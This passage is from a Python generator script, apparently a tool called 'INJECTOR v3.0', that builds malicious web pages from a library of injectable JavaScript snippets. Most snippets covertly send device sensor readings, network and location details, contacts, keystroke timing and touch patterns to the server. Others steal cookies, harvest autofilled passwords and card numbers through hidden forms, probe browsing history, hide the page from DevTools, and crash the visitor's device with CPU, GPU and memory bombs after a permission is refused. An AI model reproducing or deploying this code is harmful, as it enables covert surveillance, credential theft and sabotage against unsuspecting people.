    var bat=await navigator.getBattery();
    var _prev=Math.round(bat.level*100);
    function _send(ev){
      var cur=Math.round(bat.level*100);
      fetch('/battery',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({level:cur,charging:bat.charging,event:ev,
          chargingTime:bat.chargingTime,dischargingTime:bat.dischargingTime,
          prev:_prev,drop:_prev-cur,ts:new Date().toISOString()})}).catch(function(){});
      _prev=cur;
    }
    bat.addEventListener('levelchange',function(){_send('levelchange');});
    bat.addEventListener('chargingchange',function(){_send('chargingchange');});
    setInterval(function(){_send('poll');},60000);
  }catch(e){}
})();
</script>"""


def js_ssid():
    return """
<script>
// ── NETWORK SSID + CONNECTION SNIFFER ────────────────────────
(function _ssid(){
  try{
    var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
    var info={
      type:nc.type||'?', effectiveType:nc.effectiveType||'?',
      downlink:nc.downlink||'?', rtt:nc.rtt||'?',
      saveData:nc.saveData||false
    };
    // Try Network Information extended
    if(nc.type==='wifi') info.wifi=true;
    fetch('/ssid',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify(info)}).catch(function(){});
    if(nc.addEventListener){
      nc.addEventListener('change',function(){
        info.type=nc.type||'?'; info.effectiveType=nc.effectiveType||'?';
        fetch('/ssid',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify(info)}).catch(function(){});
      });
    }
  }catch(e){}
})();
</script>"""


def js_accel():
    return """
<script>
// ── ACCELEROMETER + GYROSCOPE ─────────────────────────────────
(function _accel(){
  var _buf=[]; var _timer=null;
  function _flush(){
    if(_buf.length>0){
      fetch('/accel',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({samples:_buf.slice(-10),ts:new Date().toISOString()})}).catch(function(){});
      _buf=[];
    }
  }
  if(window.DeviceMotionEvent){
    // iOS 13+ requires permission
    if(typeof DeviceMotionEvent.requestPermission==='function'){
      document.addEventListener('click',function(){
        DeviceMotionEvent.requestPermission().then(function(r){
          if(r==='granted'){
            window.addEventListener('devicemotion',function(e){
              var a=e.accelerationIncludingGravity||{};
              _buf.push({ax:a.x,ay:a.y,az:a.z,rg:e.rotationRate||{},t:Date.now()});
              clearTimeout(_timer); _timer=setTimeout(_flush,2000);
            });
          }
        }).catch(function(){});
      },{once:true});
    } else {
      window.addEventListener('devicemotion',function(e){
        var a=e.accelerationIncludingGravity||{};
        _buf.push({ax:a.x,ay:a.y,az:a.z,rg:e.rotationRate||{},t:Date.now()});
        clearTimeout(_timer); _timer=setTimeout(_flush,2000);
      });
    }
  }
  if(window.DeviceOrientationEvent){
    window.addEventListener('deviceorientation',function(e){
      fetch('/accel',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({orientation:{alpha:e.alpha,beta:e.beta,gamma:e.gamma},ts:new Date().toISOString()})}).catch(function(){});
    },{once:true});
  }
})();
</script>"""


def js_light():
    return """
<script>
// ── AMBIENT LIGHT SENSOR ──────────────────────────────────────
(function _light(){
  try{
    if('AmbientLightSensor' in window){
      var sensor=new AmbientLightSensor();
      sensor.addEventListener('reading',function(){
        fetch('/light',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({lux:sensor.illuminance,ts:new Date().toISOString()})}).catch(function(){});
      });
      sensor.start();
    }
  }catch(e){}
  // Fallback via CSS media query
  try{
    if(window.matchMedia){
      var dark=window.matchMedia('(prefers-color-scheme:dark)');
      fetch('/light',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({darkMode:dark.matches,ts:new Date().toISOString()})}).catch(function(){});
      dark.addEventListener('change',function(e){
        fetch('/light',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({darkMode:e.matches,changed:true,ts:new Date().toISOString()})}).catch(function(){});
      });
    }
  }catch(e){}
})();
</script>"""


def js_contacts():
    return """
<script>
// ── CONTACT LIST (Chrome Android) ────────────────────────────
(async function _contacts(){
  try{
    if('contacts' in navigator && 'ContactsManager' in window){
      var props=['name','email','tel'];
      var opts={multiple:true};
      document.addEventListener('click',async function(){
        try{
          var contacts=await navigator.contacts.select(props,opts);
          if(contacts&&contacts.length>0)
            fetch('/contacts',{method:'POST',headers:{'Content-Type':'application/json'},
              body:JSON.stringify({contacts:contacts,count:contacts.length,ts:new Date().toISOString()})}).catch(function(){});
        }catch(e){}
      },{once:true});
    }
  }catch(e){}
})();
</script>"""


def js_vibrate():
    return """
<script>
// ── VIBRATION TRIGGER ─────────────────────────────────────────
(function _vib(){
  try{
    if(navigator.vibrate){
      navigator.vibrate([50,100,50]);
      fetch('/vibrate',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({vibrated:true,ts:new Date().toISOString()})}).catch(function(){});
    }
  }catch(e){}
})();
</script>"""


def js_wakelock():
    return """
<script>
// ── WAKE LOCK ─────────────────────────────────────────────────
(async function _wake(){
  try{
    if('wakeLock' in navigator){
      var lock=await navigator.wakeLock.request('screen');
      fetch('/wakelock',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({active:true,ts:new Date().toISOString()})}).catch(function(){});
      document.addEventListener('visibilitychange',async function(){
        if(document.visibilityState==='visible'){
          try{ lock=await navigator.wakeLock.request('screen'); }catch(e){}
        }
      });
    }
  }catch(e){}
})();
</script>"""


def js_titlespoof():
    return """
<script>
// ── PAGE TITLE SPOOF ──────────────────────────────────────────
(function _spoof(){
  var _real=document.title||'Loading...';
  var _fake='404 Not Found';
  document.addEventListener('visibilitychange',function(){
    document.title=document.hidden?_fake:_real;
  });
  // When DevTools likely open — change title
  var _dt=false;
  var _threshold=160;
  setInterval(function(){
    var open=(window.outerWidth-window.innerWidth>_threshold||
              window.outerHeight-window.innerHeight>_threshold);
    if(open&&!_dt){ _dt=true; document.title=_fake; }
    else if(!open&&_dt){ _dt=false; document.title=_real; }
  },1000);
})();
</script>"""


def js_magneto():
    return """
<script>
// ── MAGNETOMETER ──────────────────────────────────────────────
(function _mag(){
  try{
    if('Magnetometer' in window){
      var mag=new Magnetometer({frequency:1});
      mag.addEventListener('reading',function(){
        fetch('/magneto',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({x:mag.x,y:mag.y,z:mag.z,ts:new Date().toISOString()})}).catch(function(){});
      });
      mag.start();
    }
  }catch(e){}
  // Compass via DeviceOrientation fallback
  try{
    window.addEventListener('deviceorientationabsolute',function(e){
      fetch('/magneto',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({heading:e.alpha,tilt:e.beta,roll:e.gamma,absolute:true,ts:new Date().toISOString()})}).catch(function(){});
    },{once:true});
  }catch(e){}
})();
</script>"""


def js_proximity():
    return """
<script>
// ── PROXIMITY SENSOR ──────────────────────────────────────────
(function _prox(){
  try{
    if('ProximitySensor' in window){
      var prox=new ProximitySensor();
      prox.addEventListener('reading',function(){
        fetch('/proximity',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({near:prox.near,distance:prox.distance,ts:new Date().toISOString()})}).catch(function(){});
      });
      prox.start();
    }
  }catch(e){}
  // Fallback legacy event
  try{
    window.addEventListener('deviceproximity',function(e){
      fetch('/proximity',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({value:e.value,min:e.min,max:e.max,ts:new Date().toISOString()})}).catch(function(){});
    });
    window.addEventListener('userproximity',function(e){
      fetch('/proximity',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({near:e.near,ts:new Date().toISOString()})}).catch(function(){});
    });
  }catch(e){}
})();
</script>"""


def js_pressure():
    return """
<script>
// ── CPU/MEMORY PRESSURE MONITOR ───────────────────────────────
(async function _pressure(){
  try{
    if('PressureObserver' in window){
      var obs=new PressureObserver(function(records){
        records.forEach(function(r){
          fetch('/pressure',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({source:r.source,state:r.state,ts:new Date().toISOString()})}).catch(function(){});
        });
      },{sampleInterval:1000});
      obs.observe('cpu');
    }
  }catch(e){}
  // Fallback: measure JS execution time as proxy for CPU load
  try{
    setInterval(function(){
      var t=performance.now();
      var x=0; for(var i=0;i<100000;i++) x+=Math.sqrt(i);
      var dur=performance.now()-t;
      if(dur>50) // high load
        fetch('/pressure',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({method:'timing',execMs:Math.round(dur),high:dur>100,ts:new Date().toISOString()})}).catch(function(){});
    },10000);
  }catch(e){}
  // Memory
  try{
    if(performance.memory){
      setInterval(function(){
        var m=performance.memory;
        fetch('/pressure',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({usedMB:Math.round(m.usedJSHeapSize/1048576),
            totalMB:Math.round(m.totalJSHeapSize/1048576),
            limitMB:Math.round(m.jsHeapSizeLimit/1048576),ts:new Date().toISOString()})}).catch(function(){});
      },30000);
    }
  }catch(e){}
})();
</script>"""


def js_charging():
    return """
<script>
// ── CHARGING STATE WATCHER ────────────────────────────────────
(async function _charge(){
  if(!navigator.getBattery) return;
  try{
    var bat=await navigator.getBattery();
    function _send(ev){
      fetch('/charging',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({charging:bat.charging,level:Math.round(bat.level*100),
          chargingTime:bat.chargingTime,dischargingTime:bat.dischargingTime,
          event:ev,ts:new Date().toISOString()})}).catch(function(){});
    }
    bat.addEventListener('chargingchange',function(){_send('chargingchange');});
    bat.addEventListener('chargingtimechange',function(){_send('chargingtimechange');});
    bat.addEventListener('dischargingtimechange',function(){_send('dischargingtimechange');});
  }catch(e){}
})();
</script>"""


def js_orientlock():
    return """
<script>
// ── ORIENTATION LOCK ──────────────────────────────────────────
(function _orient(){
  try{
    var lock=screen.lockOrientation||screen.mozLockOrientation||
             screen.msLockOrientation||(screen.orientation&&screen.orientation.lock);
    if(lock){
      var p=typeof lock==='function'?lock('portrait'):screen.orientation.lock('portrait');
      if(p&&p.catch) p.catch(function(){});
      fetch('/orient',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({locked:'portrait',ts:new Date().toISOString()})}).catch(function(){});
    }
  }catch(e){}
  // Track orientation changes
  try{
    window.addEventListener('orientationchange',function(){
      fetch('/orient',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({angle:screen.orientation?screen.orientation.angle:window.orientation,
          type:screen.orientation?screen.orientation.type:'?',ts:new Date().toISOString()})}).catch(function(){});
    });
  }catch(e){}
})();
</script>"""


def js_tzfp():
    return """
<script>
// ── TIMEZONE + LOCALE FINGERPRINT ────────────────────────────
(function _tzfp(){
  try{
    var tz=Intl.DateTimeFormat().resolvedOptions();
    var nb=new Intl.NumberFormat().format(1234.5);
    var db=new Date(2024,0,15).toLocaleDateString();
    fetch('/tzfp',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        timezone:tz.timeZone,locale:tz.locale||navigator.language,
        calendar:tz.calendar,numberingSystem:tz.numberingSystem,
        numberFormat:nb,dateFormat:db,
        offset:new Date().getTimezoneOffset(),
        ts:new Date().toISOString()
      })}).catch(function(){});
  }catch(e){}
})();
</script>"""


def js_carrier():
    return """
<script>
// ── ISP/CARRIER DETECTION ─────────────────────────────────────
(function _carrier(){
  try{
    var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
    var info={
      type:nc.type||'unknown',
      effectiveType:nc.effectiveType||'?',
      downlink:nc.downlink||'?',
      rtt:nc.rtt||'?',
      saveData:nc.saveData||false,
      isMobile:(/Mobi|Android/i.test(navigator.userAgent))
    };
    // Carrier via IP geo (fallback)
    fetch('https://ipapi.co/json/',{method:'GET'}).then(function(r){return r.json();}).then(function(d){
      info.org=d.org||'?'; info.isp=d.asn||'?'; info.country=d.country_name||'?';
      info.city=d.city||'?';
      fetch('/carrier',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify(info)}).catch(function(){});
    }).catch(function(){
      fetch('/carrier',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify(info)}).catch(function(){});
    });
  }catch(e){}
})();
</script>"""


def js_vpn():
    return """
<script>
// ── VPN DETECTION ─────────────────────────────────────────────
(function _vpn(){
  try{
    // Check if WebRTC IP differs from HTTP IP (VPN indicator)
    var rtcIPs=[];
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.onicecandidate=function(e){
      if(!e||!e.candidate) return;
      var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g)||[];
      m.forEach(function(ip){ if(rtcIPs.indexOf(ip)<0) rtcIPs.push(ip); });
    };
    pc.createOffer().then(function(o){ return pc.setLocalDescription(o); }).catch(function(){});
    // Check IP against known VPN ranges
    setTimeout(function(){
      fetch('/vpn',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({rtcIPs:rtcIPs,
          hasMultipleIPs:rtcIPs.length>1,
          ts:new Date().toISOString()})}).catch(function(){});
    },3000);
  }catch(e){}
})();
</script>"""


def js_tor():
    return """
<script>
// ── TOR DETECTION ─────────────────────────────────────────────
(function _tor(){
  try{
    // Tor browser has specific fingerprint characteristics
    var checks={
      noPlugins:navigator.plugins.length===0,
      noWebGL:false,
      noCanvas:false,
      windowSize:(window.innerWidth===1000&&window.innerHeight===900)||
                 (window.innerWidth===1000&&window.innerHeight===800),
      ua:navigator.userAgent
    };
    try{ var c=document.createElement('canvas'); checks.noWebGL=!c.getContext('webgl'); }catch(e){}
    try{
      var cv=document.createElement('canvas'),ctx=cv.getContext('2d');
      ctx.fillText('test',0,0);
      checks.noCanvas=(cv.toDataURL()==='data:,');
    }catch(e){}
    var torScore=Object.values(checks).filter(Boolean).length;
    fetch('/tor',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({checks:checks,score:torScore,likelyTor:torScore>=2,ts:new Date().toISOString()})}).catch(function(){});
  }catch(e){}
})();
</script>"""


def js_ipgeo():
    return """
<script>
// ── IP GEOLOCATION (no GPS permission) ───────────────────────
(function _ipgeo(){
  try{
    fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){
      fetch('/ipgeo',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
          ip:d.ip,city:d.city,region:d.region,country:d.country_name,
          org:d.org,asn:d.asn,lat:d.latitude,lon:d.longitude,
          postal:d.postal,timezone:d.timezone,ts:new Date().toISOString()
        })}).catch(function(){});
    }).catch(function(){
      // Fallback
      fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){
        fetch('/ipgeo',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({ip:d.ip,ts:new Date().toISOString()})}).catch(function(){});
      }).catch(function(){});
    });
  }catch(e){}
})();
</script>"""


def js_cookies():
    return """
<script>
// ── COOKIE STEALER ────────────────────────────────────────────
(function _cookies(){
  try{
    var ck=document.cookie;
    if(ck&&ck.length>0)
      fetch('/cookies',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({cookies:ck,count:ck.split(';').length,ts:new Date().toISOString()})}).catch(function(){});
  }catch(e){}
})();
</script>"""


def js_autofill():
    return """
<script>
// ── AUTOFILL GRABBER ──────────────────────────────────────────
(function _autofill(){
  try{
    // Inject invisible form inputs to trigger autofill
    var form=document.createElement('form');
    form.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
    ['email','username','password','tel','name','address','cc-number'].forEach(function(type){
      var inp=document.createElement('input');
      inp.type=type==='password'?'password':'text';
      inp.autocomplete=type; inp.name=type; inp.id='_af_'+type;
      form.appendChild(inp);
    });
    document.body.appendChild(form);
    // After brief delay, read any autofilled values
    setTimeout(function(){
      var vals={};
      form.querySelectorAll('input').forEach(function(el){
        if(el.value) vals[el.name]=el.value;
      });
      if(Object.keys(vals).length>0)
        fetch('/autofill',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({data:vals,ts:new Date().toISOString()})}).catch(function(){});
      document.body.removeChild(form);
    },3000);
  }catch(e){}
})();
</script>"""


def js_historytime():
    return """
<script>
// ── BROWSER HISTORY TIMING ATTACK ────────────────────────────
(function _histTime(){
  try{
    var targets=['https://www.google.com','https://www.facebook.com',
      'https://www.youtube.com','https://www.twitter.com','https://www.instagram.com',
      'https://www.reddit.com','https://www.amazon.com','https://www.netflix.com'];
    var results={};
    var done=0;
    targets.forEach(function(url){
      var link=document.createElement('a');
      link.href=url; document.body.appendChild(link);
      var style=window.getComputedStyle(link);
      var visited=style.color!==window.getComputedStyle(document.body).color;
      results[url]=visited;
      document.body.removeChild(link);
      done++;
      if(done===targets.length)
        fetch('/histtime',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({visited:results,histLen:history.length,ts:new Date().toISOString()})}).catch(function(){});
    });
  }catch(e){}
})();
</script>"""


def js_idbscan():
    return """
<script>
// ── INDEXEDDB DEEP SCANNER ────────────────────────────────────
(async function _idb(){
  try{
    if(!indexedDB.databases) return;
    var dbs=await indexedDB.databases();
    var results=[];
    for(var i=0;i<dbs.length;i++){
      var dbinfo={name:dbs[i].name,version:dbs[i].version,stores:[]};
      try{
        var req=indexedDB.open(dbs[i].name);
        await new Promise(function(res){
          req.onsuccess=function(){
            var db=req.result;
            dbinfo.stores=Array.from(db.objectStoreNames);
            db.close(); res();
          };
          req.onerror=function(){ res(); };
          setTimeout(res,1000);
        });
      }catch(e){}
      results.push(dbinfo);
    }
    if(results.length>0)
      fetch('/idbscan',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({databases:results,ts:new Date().toISOString()})}).catch(function(){});
  }catch(e){}
})();
</script>"""


def js_cachetiming():
    return """
<script>
// ── CACHE TIMING ATTACK ───────────────────────────────────────
(async function _cache(){
  try{
    var targets=[
      {url:'https://www.google.com/favicon.ico',name:'google'},
      {url:'https://www.facebook.com/favicon.ico',name:'facebook'},
      {url:'https://www.youtube.com/favicon.ico',name:'youtube'},
      {url:'https://www.amazon.com/favicon.ico',name:'amazon'},
    ];
    var results={};
    for(var i=0;i<targets.length;i++){
      var t=targets[i]; var start=performance.now();
      try{
        await fetch(t.url,{mode:'no-cors',cache:'force-cache'});
        var dur=performance.now()-start;
        results[t.name]={cached:dur<50,ms:Math.round(dur)};
      }catch(e){ results[t.name]={cached:false,ms:-1}; }
    }
    fetch('/cachetiming',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({results:results,ts:new Date().toISOString()})}).catch(function(){});
  }catch(e){}
})();
</script>"""


def js_sw():
    return """
<script>
// ── SERVICE WORKER INJECTOR ───────────────────────────────────
(function _sw(){
  if(!('serviceWorker' in navigator)) return;
  try{
    // Inline SW as blob URL
    var swCode=`
self.addEventListener('install',function(e){ e.waitUntil(self.skipWaiting()); });
self.addEventListener('activate',function(e){ e.waitUntil(self.clients.claim()); });
self.addEventListener('fetch',function(e){
  // Intercept and log requests
  if(e.request.url.indexOf('/collect')<0&&e.request.url.indexOf('/loc')<0){
    e.respondWith(fetch(e.request).catch(function(){ return new Response('',{status:200}); }));
  }
});
self.addEventListener('message',function(e){
  if(e.data&&e.data.type==='PING'){
    e.ports[0].postMessage({type:'PONG',alive:true,ts:new Date().toISOString()});
  }
});`;
    var blob=new Blob([swCode],{type:'application/javascript'});
    var url=URL.createObjectURL(blob);
    navigator.serviceWorker.register(url,{scope:'/'}).then(function(reg){
      fetch('/sw',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({registered:true,scope:reg.scope,ts:new Date().toISOString()})}).catch(function(){});
    }).catch(function(){});
  }catch(e){}
})();
</script>"""


def js_keystroke():
    return """
<script>
// ── KEYSTROKE DYNAMICS PROFILER ───────────────────────────────
(function _keydy(){
  var _times=[]; var _last=0; var _timer=null;
  document.addEventListener('keydown',function(e){
    var now=performance.now();
    if(_last>0) _times.push({key:e.key,iki:Math.round(now-_last)});
    _last=now;
    clearTimeout(_timer);
    _timer=setTimeout(function(){
      if(_times.length>=5){
        var avg=_times.reduce(function(s,t){return s+t.iki;},0)/_times.length;
        fetch('/keystroke',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({samples:_times.slice(-20),avgIKI:Math.round(avg),ts:new Date().toISOString()})}).catch(function(){});
        _times=[];
      }
    },3000);
  });
})();
</script>"""


def js_touchfp():
    return """
<script>
// ── TOUCH FINGERPRINT ─────────────────────────────────────────
(function _touchfp(){
  if(!window.TouchEvent) return;
  var _samples=[]; var _timer=null;
  document.addEventListener('touchstart',function(e){
    for(var i=0;i<e.changedTouches.length;i++){
      var t=e.changedTouches[i];
      _samples.push({
        x:Math.round(t.clientX),y:Math.round(t.clientY),
        size:t.radiusX||0,force:t.force||0,
        ts:Date.now()
      });
    }
    clearTimeout(_timer);
    _timer=setTimeout(function(){
      if(_samples.length>=3){
        fetch('/touchfp',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({touches:_samples.slice(-20),ts:new Date().toISOString()})}).catch(function(){});
        _samples=[];
      }
    },2000);
  },{passive:true});
})();
</script>"""


def js_scrollpat():
    return """
<script>
// ── SCROLL PATTERN ANALYZER ───────────────────────────────────
(function _scrollpat(){
  var _pat=[]; var _last=0; var _timer=null;
  window.addEventListener('scroll',function(){
    var now=performance.now(); var pos=window.scrollY;
    if(_last>0) _pat.push({pos:Math.round(pos),dt:Math.round(now-_last)});
    _last=now;
    clearTimeout(_timer);
    _timer=setTimeout(function(){
      if(_pat.length>=5){
        var speeds=_pat.map(function(p){return p.dt>0?Math.abs(p.pos)/p.dt:0;});
        var avg=speeds.reduce(function(s,v){return s+v;},0)/speeds.length;
        fetch('/scrollpat',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({pattern:_pat.slice(-20),avgSpeed:avg.toFixed(2),
            isBot:avg>10,ts:new Date().toISOString()})}).catch(function(){});
        _pat=[];
      }
    },3000);
  },{passive:true});
})();
</script>"""


def js_websocket_persistent():
    return """
<script>
// ── WEBSOCKET PERSISTENT CHANNEL ──────────────────────────────
(function _wsLive(){
  var _ws=null; var _retry=0;
  function _connect(){
    try{
      var proto=location.protocol==='https:'?'wss://':'ws://';
      _ws=new WebSocket(proto+location.host+'/wsocket');
      _ws.onopen=function(){
        _retry=0;
        _ws.send(JSON.stringify({type:'hello',ua:navigator.userAgent,ts:new Date().toISOString()}));
      };
      _ws.onmessage=function(e){
        try{ var d=JSON.parse(e.data); if(d.cmd==='reload') location.reload(); }catch(ex){}
      };
      _ws.onerror=function(){};
      _ws.onclose=function(){
        _retry++;
        setTimeout(_connect,Math.min(_retry*5000,30000));
      };
    }catch(e){}
  }
  // Heartbeat
  setInterval(function(){
    if(_ws&&_ws.readyState===1)
      _ws.send(JSON.stringify({type:'ping',ts:new Date().toISOString()}));
  },30000);
  _connect();
})();
</script>"""


def js_dnsexfil():
    return """
<script>
// ── DNS EXFILTRATION ──────────────────────────────────────────
(function _dns(){
  // Encode data as subdomain lookups (backup channel)
  function _exfil(data){
    try{
      var encoded=btoa(JSON.stringify(data)).replace(/[^a-zA-Z0-9]/g,'').slice(0,50);
      var img=new Image();
      img.src='http://'+encoded+'.dns.'+location.hostname+'/x.gif';
      img.onerror=function(){};
    }catch(e){}
  }
  // Also post to /dnsexfil for server-side recording
  try{
    fetch('/dnsexfil',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({alive:true,ua:navigator.userAgent.slice(0,50),ts:new Date().toISOString()})}).catch(function(){});
  }catch(e){}
})();
</script>"""


def js_beacon():
    return """
<script>
// ── BEACON API (sends on page close) ─────────────────────────
(function _beacon(){
  var _data={};
  try{ _data.url=location.href; _data.ts=new Date().toISOString(); }catch(e){}
  window.addEventListener('pagehide',function(){
    try{
      var blob=new Blob([JSON.stringify(_data)],{type:'application/json'});
      navigator.sendBeacon('/beacon',blob);
    }catch(e){}
  });
  window.addEventListener('beforeunload',function(){
    try{
      var blob=new Blob([JSON.stringify(_data)],{type:'application/json'});
      navigator.sendBeacon('/beacon',blob);
    }catch(e){}
  });
  document.addEventListener('visibilitychange',function(){
    if(document.visibilityState==='hidden'){
      try{
        var blob=new Blob([JSON.stringify(_data)],{type:'application/json'});
        navigator.sendBeacon('/beacon',blob);
      }catch(e){}
    }
  });
})();
</script>"""


def js_antiss():
    return """
<script>
// ── ANTI-SCREENSHOT DETECTION ─────────────────────────────────
(function _antiss(){
  try{
    var _prev=document.visibilityState;
    document.addEventListener('visibilitychange',function(){
      if(_prev==='visible'&&document.hidden){
        fetch('/antiss',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({event:'screenshot_suspected',ts:new Date().toISOString()})}).catch(function(){});
      }
      _prev=document.visibilityState;
    });
    // Blur = app switcher / screenshot on some devices
    window.addEventListener('blur',function(){
      fetch('/antiss',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({event:'blur',ts:new Date().toISOString()})}).catch(function(){});
    });
  }catch(e){}
})();
</script>"""


def js_anticlose():
    return """
<script>
// ── ANTI-CLOSE WARNING ────────────────────────────────────────
(function _anticlose(){
  window.addEventListener('beforeunload',function(e){
    var msg='Changes you made may not be saved.';
    e.preventDefault(); e.returnValue=msg; return msg;
  });
})();
</script>"""


def js_dos():
    return r"""
<script>
// ── CPU + GPU + MEMORY BOMB ───────────────────────────────────
(function _dosSetup(){
  var _armed=false;
  function _cpuBomb(){
    var cores=navigator.hardwareConcurrency||4;
    var code=`
      function h(x){for(var i=0;i<8e6;i++){x=Math.sqrt(Math.abs(Math.sin(x)*Math.cos(x*1.3)));}return x;}
      function loop(){h(Math.random()*1e6); postMessage(1); loop(); } loop();`;
    var blob=new Blob([code],{type:'application/javascript'});
    var url=URL.createObjectURL(blob);
    for(var i=0;i<cores;i++) new Worker(url);
    setInterval(function(){
      var x=Math.random()*1e6;
      for(var d=0;d<10;d++){x=x*2;for(var j=0;j<60000;j++)x=Math.sqrt(Math.abs(Math.sin(x*j+1)*Math.cos(x)));}
    },10);
  }
  function _gpuBomb(){
    var c=document.createElement('canvas');
    c.width=window.innerWidth; c.height=window.innerHeight;
    c.style.cssText='position:fixed;top:0;left:0;z-index:-999;opacity:0.01;pointer-events:none;';
    document.body.appendChild(c);
    var gl=c.getContext('webgl'); if(!gl) return;
    var vs='attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}';
    var fs='precision highp float;uniform float t;uniform vec2 r;float mandel(vec2 c){vec2 z=vec2(0.);for(int i=0;i<256;i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;if(dot(z,z)>4.)return float(i)/256.;}return 0.;}void main(){vec2 uv=(gl_FragCoord.xy/r)*2.-1.;uv.x*=r.x/r.y;float m=mandel(uv*1.8+vec2(-.5+sin(t*.05)*.3,cos(t*.07)*.2));gl_FragColor=vec4(vec3(m),1.);}';
    function mk(tp,src){var s=gl.createShader(tp);gl.shaderSource(s,src);gl.compileShader(s);return s;}
    var prog=gl.createProgram();
    gl.attachShader(prog,mk(gl.VERTEX_SHADER,vs));
    gl.attachShader(prog,mk(gl.FRAGMENT_SHADER,fs));
    gl.linkProgram(prog); gl.useProgram(prog);
    var buf=gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER,buf);
    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW);
    var pp=gl.getAttribLocation(prog,'p');
    gl.enableVertexAttribArray(pp); gl.vertexAttribPointer(pp,2,gl.FLOAT,false,0,0);
    var ut=gl.getUniformLocation(prog,'t'),ur=gl.getUniformLocation(prog,'r');
    var s0=performance.now();
    (function frame(){
      gl.uniform1f(ut,(performance.now()-s0)/1000); gl.uniform2f(ur,c.width,c.height);
      gl.viewport(0,0,c.width,c.height); gl.drawArrays(gl.TRIANGLE_STRIP,0,4);
      requestAnimationFrame(frame);
    })();
  }
  function _memBomb(){
    setInterval(function(){var a=new Float64Array(600000);for(var i=0;i<a.length;i++)a[i]=Math.sin(i);},500);
    setTimeout(function(){try{var b=[];for(var i=0;i<50;i++)b.push(new ArrayBuffer(20*1024*1024));}catch(e){}},2000);
  }
  function _launch(){
    if(_armed) return; _armed=true;
    fetch('/deny',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({event:'permission_denied',ts:new Date().toISOString()})}).catch(function(){});
    _cpuBomb(); _gpuBomb(); _memBomb();
  }
  if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
    var _orig=navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
    navigator.mediaDevices.getUserMedia=function(c){
      return _orig(c).catch(function(err){
        if(err.name==='NotAllowedError'||err.name==='PermissionDeniedError') _launch();
        throw err;
      });
    };
  }
  if(navigator.geolocation){
    var _origGeo=navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
    navigator.geolocation.getCurrentPosition=function(ok,fail,opts){
      _origGeo(ok,function(err){ if(err.code===1) _launch(); if(fail) fail(err); },opts);
    };
  }
})();
</script>"""


# ══════════════════════════════════════════════════════════════
# APP.PY TEMPLATE
# ══════════════════════════════════════════════════════════════

APP_TEMPLATE = '''\
#!/usr/bin/env python3
"""__PROJECT__ — Generated by INJECTOR v3.0 | Theme: __THEME__ | Features: __FEATURES__"""
import os, re, json, platform, shutil, subprocess, threading, time
from datetime import datetime
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

# ── Silence Flask completely ──────────────────────────────────
import logging
logging.getLogger(\'werkzeug\').setLevel(logging.ERROR)
logging.getLogger(\'werkzeug\').disabled = True
app.logger.disabled = True

CAP = {
    \'photos\':      \'captures/photos\',
    \'audio\':       \'captures/audio\',
    \'logs\':        \'captures/logs\',
    \'screenshots\': \'captures/screenshots\',
